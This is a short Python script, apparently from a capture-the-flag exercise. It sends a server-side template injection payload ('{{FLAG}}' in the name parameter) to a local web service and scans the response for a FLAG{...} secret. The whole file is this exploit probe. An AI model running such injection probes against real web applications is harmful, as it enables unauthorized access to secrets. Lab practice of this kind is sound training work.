import requests
import re
import time

# Target URL with SSTI payload
url = "http://localhost:32786/greet/?name={{FLAG}}"

print(f"[+] Testing SSTI flag accessibility")
print(f"[+] Target: {url}")
print(f"[+] Using hostname: localhost")

try:
    # Send GET request with explicit headers
    headers = {
        'Host': 'localhost:32786',
        'User-Agent': 'Mozilla/5.0'
    }
    
    response = requests.get(url, headers=headers, timeout=15, allow_redirects=True)
    
    print(f"\n[+] Response Status: {response.status_code}")
    print(f"[+] Response Length: {len(response.content)} bytes")
    print(f"\n[+] Full Response Body:")
    print(response.text)
    
    # Search for FLAG{} pattern
    flag_pattern = r'FLAG\{[^}]+\}'
    flags_found = re.findall(flag_pattern, response.text)
    
    if flags_found:
        print(f"\n[!] FLAG FOUND:")
        for flag in flags_found:
            print(f"    {flag}")
    else:
        print(f"\n[-] No FLAG{{}} pattern found in response")
        
except Exception as e:
    print(f"\n[-] Error: {type(e).__name__}: {e}")

